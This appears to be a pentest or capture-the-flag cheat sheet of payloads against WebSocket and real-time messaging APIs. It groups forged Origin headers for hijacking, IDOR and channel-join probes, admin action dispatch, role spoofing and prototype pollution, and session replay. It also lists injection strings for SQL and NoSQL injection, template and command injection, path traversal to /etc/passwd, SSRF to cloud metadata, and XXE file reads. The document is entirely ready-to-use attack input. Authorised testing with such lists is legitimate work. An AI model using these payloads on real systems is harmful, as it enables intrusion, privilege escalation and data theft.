# Payload variants — the named payloads, grouped

## The Origin payloads

```text
Origin: https://evil.example
Origin: null
Origin: file://
Origin: https://target.evil.com
Origin: https://eviltarget.com
Origin: https://target.com.evil.com
Origin: https://sub.target.com
Origin: https://target.com.attacker.com
Origin: https://targetcom.com
(omit Origin entirely)
```

## The binding payloads

```text
Cookie: session=<victim>
Authorization: Bearer <token>
Authorization: Basic <b64>
?token=<jwt>  ?jwt=<jwt>  ?auth=<x>  ?key=<key>  ?api_key=<key>  ?session=<s>
X-Api-Key: <key>  X-Auth-Token: <token>  X-Session: <s>
{"type":"auth","token":"<x>"}
40{"token":"<x>"}                        (socket.io)
{"type":"connection_init","payload":{"authToken":"<x>"}}   (graphql-ws)
CONNECT\nlogin:<u>\npasscode:<p>\n\n^@   (stomp)
```

## The object-IDOR payloads

```json
{"action":"read","id":"<other>"}
{"action":"read","id":"admin"}      {"action":"read","id":1}
{"action":"read","id":"me"}         {"action":"read","id":"self"}
{"action":"read","id":"current"}    {"action":"read","id":"0"}
{"action":"open","doc":"<other>"}   {"action":"load","document":"<x>"}
{"action":"history","room":"<other>"}  {"action":"conversation","id":"<x>"}
{"action":"get","user_id":<n>}      {"action":"view","account":"<x>"}
{"action":"list","org":"<x>"}       {"action":"export","object":"<x>"}
{"action":"fetch","item":"<x>"}     {"action":"read","id":"../admin"}
{"action":"read","id":"*"}          {"action":"read","id":"-1"}
```

## The membership payloads

```json
{"action":"join","room":"admin"}
{"action":"join","channel":"internal"}
{"action":"subscribe","channel":"internal"}
{"action":"subscribe","topic":"/user/<other>/events"}
{"action":"watch","doc":"admin-doc"}
{"action":"listen","topic":"internal"}
{"action":"follow","channel":"private"}
{"action":"subscribe","channel":"#"}   {"action":"subscribe","channel":"+"}
```

## The action-dispatch payloads

```json
{"action":"admin"}    {"action":"debug"}    {"action":"internal"}
{"action":"system"}   {"action":"eval","code":"x"}    {"action":"exec","cmd":"id"}
{"action":"sql","q":"x"}    {"action":"flag"}   {"action":"secret"}
{"action":"config","key":"x"}    {"action":"broadcast","text":"x"}
{"action":"announce","msg":"x"}  {"action":"set_role","role":"admin"}
{"action":"impersonate","user":"admin"}    {"action":"grant","perm":"admin"}
{"action":"reset","user":"admin"}    {"action":"dump"}   {"action":"export"}
{"action":"backup"}   {"action":"metrics"}   {"action":"reload"}
{"action":"migrate"}  {"action":"seed"}      {"action":"su","user":"root"}
{"action":"login_as","user":"admin"} {"action":"admin:flag"}
{"action":"system.exec"}  {"action":"internal/cmd"}
{"type":"admin"}      {"event":"admin"}      {"cmd":"admin"}
```

## The grant/spoof payloads

```json
{"action":"x","role":"admin"}        {"action":"x","is_admin":true}
{"action":"x","debug":true}          {"action":"x","internal":true}
{"action":"x","perm":["admin"]}      {"action":"x","scope":"*"}
{"action":"x","level":9}             {"action":"x","tier":"staff"}
{"action":"x","admin":true,"sudo":true}
{"action":"x","user":{"role":"admin"}}
{"action":"x","__proto__":{"role":"admin"}}
{"from":"victim","action":"x"}       {"sender":"admin","action":"x"}
{"user_id":2,"action":"x"}           {"user":"admin","action":"x"}
{"action":"x","user":{"id":"<other>","role":"<r>"}}
{"action":"dm","to":"<x>","from":"<other>"}
```

## The injection payloads

```json
{"q":"x' OR '1'='1--"}              {"q":"x' UNION SELECT flag,2,3--"}
{"q":{"$ne":null}}                  {"id":{"$gt":""}}
{"q":{"$where":"return true"}}      {"name":"{{7*7}}"}
{"name":"{{config.FLAG}}"}          {"tpl":"${7*7}"}
{"text":"<%= 7*7 %>"}               {"host":"x;id"}
{"cmd":"id"}                        {"exec":"cat /flag"}
{"target":"x|id"}                   {"file":"../../etc/passwd"}
{"path":"/flag"}                    {"doc":"..\\..\\flag.txt"}
{"url":"http://169.254.169.254/latest/meta-data/"}
{"fetch":"file:///flag"}            {"webhook":"http://internal/admin"}
{"xml":"<!DOCTYPE r[<!ENTITY x SYSTEM 'file:///flag'>]><r>&x;</r>"}
{"data":"<serialized>"}             {"obj":"<ser>"}
{"obj":{"__proto__":{"isAdmin":true}}}
{"config":{"key":"__proto__.role","value":"admin"}}
{"order":"name,(case when 1=1 then id else name end)"}
```

## The session/resume payloads

```json
{"session_id":"<old>"}   {"resume":"<old-session>"}
{"reconnect":true,"session_id":"<old>"}  {"seq":0}
{"offset":0}             {"lastEventId":-1}
{"action":"history","room":"<x>","from":0,"to":N}
{"action":"backlog","channel":"<x>"}     {"action":"fetch","since":"<old-ts>"}
{"token":"<forged-jwt>"}                 {"auth":"<stale>"}
/socket.io/?EIO=4&transport=websocket&sid=<old-sid>
```

## The write-side payloads

```json
{"action":"broadcast","text":"x"}    {"action":"announce","msg":"x"}
{"action":"emit-all","data":{...}}   {"action":"send_all","data":{...}}
{"action":"set","key":"x","value":"y"}
{"action":"config","key":"x","value":"y"}
{"action":"transfer","from":"<x>","to":"me","amount":N}
{"action":"update","id":"<other>","field":"x"}
{"action":"delete","id":"<other>"}   {"action":"remove","id":"<other>"}
{"action":"create","obj":{...}}      {"action":"insert","doc":{...}}
```
